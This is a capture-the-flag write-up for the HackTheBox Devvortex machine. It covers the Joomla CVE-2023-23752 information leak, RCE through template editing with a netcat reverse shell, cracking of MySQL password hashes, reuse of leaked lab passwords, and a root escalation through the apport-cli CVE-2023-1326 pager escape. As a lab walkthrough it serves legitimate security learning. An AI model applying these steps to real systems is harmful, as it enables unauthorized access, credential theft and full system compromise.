---
layout: writeup
category: HTB
points: 20
solves: 14523
tags: joomla CVE-2023-23752 information_leakage password_reuse joomla_rce database_enumeration hash_cracking ssh sudoers apport-cli CVE-2023-1326
date: 2024-04-26
comments: false
description: In this machine, we have a joomla web vulnerable to [CVE-2023-23752](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure) that gives us the password of lewis user to the database and is reused for joomla login. With this login we can perform RCE editing a joomla template. Then, to escalate as logan, we can connect to the database, retrieve the hash and crack it. Finally, for privilege escalation we have a sudoers privilege that let us run the apport-cli command, whose version is vulnerable to [CVE-2023-1326](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb).
title: HTB Devvortex Writeup
---

In this machine, we have a joomla web vulnerable to [CVE-2023-23752](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure) that gives us the password of lewis user to the database and is reused for joomla login. With this login we can perform RCE editing a joomla template. Then, to escalate as logan, we can connect to the database, retrieve the hash and crack it. Finally, for privilege escalation we have a sudoers privilege that let us run the apport-cli command, whose version is vulnerable to [CVE-2023-1326](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb).

# Enumeration

## Port scanning

We need to start with a port scanning to see which services are available in order to try to exploit them:

```bash
❯ sudo nmap -p- -sVC --open -sS --min-rate 5000 -n -Pn 10.10.11.242 -oN tcpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 17:05 CEST
Nmap scan report for 10.10.11.242
Host is up (0.097s latency).
Not shown: 65525 closed tcp ports (reset), 8 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds
```

We can see port 22 of ssh with a newer version and port 80 with also a newer version and a redirect to devvortex.htb, let's add it to the /etc/hosts for resolving that domain to the ip of the machine:

```bash
❯ sudo echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts
10.10.11.242 devvortex.htb
```

## Web enumeration

Since we have a domain we can try to discover subdomains by bruteforcing:

```bash
❯ wfuzz -c -t 100 -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh=154
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                                                                                                                  

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

We discovered the dev subdomain, now let's add it to the /etc/hosts also:

```bash
❯ sudo echo '10.10.11.242 dev.devvortex.htb' | sudo tee -a /etc/hosts
10.10.11.242 dev.devvortex.htb
```

Now that we have the domains added, let's open them in the browser:

![Screenshot of devvortex.htb page](/assets/images/Devvortex/devvortex.htb.png)

![Screenshot of dev.devvortex.htb webpage](/assets/images/Devvortex/dev.devvortex.htb.png)

Since we don't see nothing interesting in this pages, we have to discover new folders/files to see in the webserver, I'll start with devvortex.htb:

```bash
❯ wfuzz -c -t 100 -u http://devvortex.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt --hc=404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 0
Processed Requests: 4727
Filtered Requests: 4727
Requests/sec.: 0
```

With the common wordlist we don't see nothing, if we don't have something later, we will try with a bigger dictionary (directory-list-2.3-medium.txt). Now i will try with dev.devvortex.htb:

```bash
❯ wfuzz -c -t 100 -u http://dev.devvortex.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt --hc=404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.devvortex.htb/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   403        7 L      10 W       162 Ch      ".bash_history"                                                                                                        
000000025:   403        7 L      10 W       162 Ch      ".htpasswd"                                                                                                            
000000022:   403        7 L      10 W       162 Ch      ".history"                                                                                                             
000000011:   403        7 L      10 W       162 Ch      ".git/config"                                                                                                          
000000009:   403        7 L      10 W       162 Ch      ".git-rewrite"                                                                                                         
000000007:   403        7 L      10 W       162 Ch      ".forward"                                                                                                             
000000037:   403        7 L      10 W       162 Ch      ".svn/entries"                                                                                                         
000000023:   403        7 L      10 W       162 Ch      ".hta"                                                                                                                 
000000029:   403        7 L      10 W       162 Ch      ".passwd"                                                                                                              
000000004:   403        7 L      10 W       162 Ch      ".config"                                                                                                              
000000002:   403        7 L      10 W       162 Ch      ".bashrc"                                                                                                              
000000005:   403        7 L      10 W       162 Ch      ".cvs"                                                                                                                 
000000016:   403        7 L      10 W       162 Ch      ".gitconfig"                                                                                                           
000000008:   403        7 L      10 W       162 Ch      ".git"                                                                                                                 
000000006:   403        7 L      10 W       162 Ch      ".cvsignore"                                                                                                           
000000014:   403        7 L      10 W       162 Ch      ".git_release"                                                                                                         
000000017:   403        7 L      10 W       162 Ch      ".gitignore"                                                                                                           
000000018:   403        7 L      10 W       162 Ch      ".gitk"                                                                                                                
000000021:   403        7 L      10 W       162 Ch      ".gitreview"                                                                                                           
000000003:   403        7 L      10 W       162 Ch      ".cache"                                                                                                               
000000019:   403        7 L      10 W       162 Ch      ".gitkeep"                                                                                                             
000000015:   403        7 L      10 W       162 Ch      ".gitattributes"                                                                                                       
000000020:   403        7 L      10 W       162 Ch      ".gitmodules"                                                                                                          
000000012:   403        7 L      10 W       162 Ch      ".git/index"                                                                                                           
000000040:   403        7 L      10 W       162 Ch      ".web"                                                                                                                 
000000035:   403        7 L      10 W       162 Ch      ".subversion"                                                                                                          
000000034:   403        7 L      10 W       162 Ch      ".ssh"                                                                                                                 
000000031:   403        7 L      10 W       162 Ch      ".profile"                                                                                                             
000000027:   403        7 L      10 W       162 Ch      ".listings"                                                                                                            
000000033:   403        7 L      10 W       162 Ch      ".sh_history"                                                                                                          
000000030:   403        7 L      10 W       162 Ch      ".perf"                                                                                                                
000000026:   403        7 L      10 W       162 Ch      ".listing"                                                                                                             
000000039:   403        7 L      10 W       162 Ch      ".swf"                                                                                                                 
000000024:   403        7 L      10 W       162 Ch      ".htaccess"                                                                                                            
000000038:   403        7 L      10 W       162 Ch      ".svnignore"                                                                                                           
000000028:   403        7 L      10 W       162 Ch      ".mysql_history"                                                                                                       
000000032:   403        7 L      10 W       162 Ch      ".rhosts"                                                                                                              
000000036:   403        7 L      10 W       162 Ch      ".svn"                                                                                                                 
000000013:   403        7 L      10 W       162 Ch      ".git/logs/"                                                                                                           
000000010:   403        7 L      10 W       162 Ch      ".git/HEAD"                                                                                                            
000000555:   301        7 L      12 W       178 Ch      "administrator"                                                                                                        
000000663:   301        7 L      12 W       178 Ch      "api"                                                                                                                  
000000956:   301        7 L      12 W       178 Ch      "cache"                                                                                                                
000001201:   301        7 L      12 W       178 Ch      "components"                                                                                                           
000002195:   301        7 L      12 W       178 Ch      "includes"                                                                                                             
000002174:   301        7 L      12 W       178 Ch      "images"                                                                                                               
000002094:   200        501 L    1581 W     23221 Ch    "home"                                                                                                                 
000002202:   200        501 L    1581 W     23221 Ch    "index.php"                                                                                                            
000002454:   301        7 L      12 W       178 Ch      "libraries"                                                                                                            
000002433:   301        7 L      12 W       178 Ch      "layouts"                                                                                                              
000002415:   301        7 L      12 W       178 Ch      "language"                                                                                                             
000002640:   301        7 L      12 W       178 Ch      "media"                                                                                                                
000002730:   301        7 L      12 W       178 Ch      "modules"                                                                                                              
000003162:   301        7 L      12 W       178 Ch      "plugins"                                                                                                              
000003581:   200        29 L     105 W      764 Ch      "robots.txt"                                                                                                           
000004108:   301        7 L      12 W       178 Ch      "templates"                                                                                                            
000004180:   301        7 L      12 W       178 Ch      "tmp"                                                                                                                  

Total time: 0
Processed Requests: 4727
Filtered Requests: 4670
Requests/sec.: 0
```

We have a bunch of 403 requests with directories followed by a "." so it's not relevant because it seems that if we request for a path with some random words followed by a ".", we have a 403:

![A screenshot of how the web page returns 403 in every path followed by a .](/assets/images/Devvortex/403_on_every_path_followed_by_a_..png)

The most interesting thing here is the /administrator path which has a joomla login:

![Joomla panel login](/assets/images/Devvortex/joomla_panel_login.png)

We can see the joomla version with the file /README.txt:

![README version](/assets/images/Devvortex/README_version.png)

Searching in google for vulnerabilities of this version, we can see [this api endpoint vulnerable to information disclosure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure) in this version 4.2 to retrieve users and config file, let's use it:

![Joomla 4.2 vulnerable API endpoint exploiting](/assets/images/Devvortex/joomla_4.2_vulnerable_endpoint_exploiting.png)

If we try to use this credentials in the joomla login, we login successfully:

![Login](/assets/images/Devvortex/login_in_joomla.png)

![Logged in](/assets/images/Devvortex/logged_in.png)

# Access as www-data

Now that we have access to the joomla administrator panel, we can perform RCE in the [typical way Joomla is exploited](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce) navigating to System > Site Templates > Cassiopeia and in error.php injecting the malicious code:

![Injecting PHP code](/assets/images/Devvortex/injecting_php_code.png)

![Executing reverse shell command](/assets/images/Devvortex/executing_reverse_shell_command.png)

![Gaining access](/assets/images/Devvortex/gaining_access.png)

Let's stabilize the tty for doing ctrl+l and ctrl+c without any problem:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.99] from (UNKNOWN) [10.10.11.242] 34744
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ script /dev/null -c bash
<.htb/templates/cassiopeia$ script /dev/null -c bash         
Script started, file is /dev/null
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ ^Z
[1]  + 439239 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 439239 continued  nc -lvnp 443
                                     reset xterm
www-data@devvortex.htb/templates/cassiopeia$ export TERM=xterm                         
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ export SHELL=bash
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ stty rows 50 columns 184
```

# Privilege escalation to logan

Inspecting the database we can see the logan hash:

```bash
www-data@devvortex:~$ mysql -ulewis -p'P4ntherg0t1n5r3c0n##'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> describe sd4fg_users;
+---------------+---------------+------+-----+---------+----------------+
| Field         | Type          | Null | Key | Default | Extra          |
+---------------+---------------+------+-----+---------+----------------+
| id            | int           | NO   | PRI | NULL    | auto_increment |
| name          | varchar(400)  | NO   | MUL |         |                |
| username      | varchar(150)  | NO   | UNI |         |                |
| email         | varchar(100)  | NO   | MUL |         |                |
| password      | varchar(100)  | NO   |     |         |                |
| block         | tinyint       | NO   | MUL | 0       |                |
| sendEmail     | tinyint       | YES  |     | 0       |                |
| registerDate  | datetime      | NO   |     | NULL    |                |
| lastvisitDate | datetime      | YES  |     | NULL    |                |
| activation    | varchar(100)  | NO   |     |         |                |
| params        | text          | NO   |     | NULL    |                |
| lastResetTime | datetime      | YES  |     | NULL    |                |
| resetCount    | int           | NO   |     | 0       |                |
| otpKey        | varchar(1000) | NO   |     |         |                |
| otep          | varchar(1000) | NO   |     |         |                |
| requireReset  | tinyint       | NO   |     | 0       |                |
| authProvider  | varchar(100)  | NO   |     |         |                |
+---------------+---------------+------+-----+---------+----------------+
17 rows in set (0.01 sec)

mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

Let's try to crack it:

```bash
❯ cat logan.hash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: logan.hash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ john -w=/usr/share/wordlists/rockyou.txt logan.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:09 DONE (2024-04-27 12:28) 0.1034g/s 145.1p/s 145.1c/s 145.1C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can ssh with that password to user logan and retrieve user.txt flag:

```bash
❯ ssh logan@devvortex.htb
logan@devvortex.htb's password: tequieromucho 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 27 Apr 2024 10:30:06 AM UTC

  System load:  0.0               Processes:             168
  Usage of /:   63.5% of 4.76GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ export TERM=xterm
logan@devvortex:~$ cat user.txt
09****************************2a
```

# Privilege escalation to root

Looking at the sudoers privileges, we can see a privilege for running a tool called apport-cli:

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: tequieromucho
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

If we run it they say us to see the --help panel, let's use it:

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli 
No pending crash reports. Try --help for more information.
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```

Searching in google we found [this article](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) that says that we can have privilege escalation for version 2.26.0 and earlier. And our version is:

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
```

So it is vulnerable.

Since there is no file in /var/crash, we can manage to create a crash file with the -P pid option that is listed in the help panel. We can do it with any PID of a running process (run ps -ux):

```bash
logan@devvortex:/tmp$ sudo /usr/bin/apport-cli -f -P 1343

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.....................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (7.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
!id
uid=0(root) gid=0(root) groups=0(root)
!bash
root@devvortex:/tmp# whoami
root
root@devvortex:/tmp# cd
root@devvortex:~# cat root.txt 
c4****************************bb

```

And we are root! Hope you liked it!
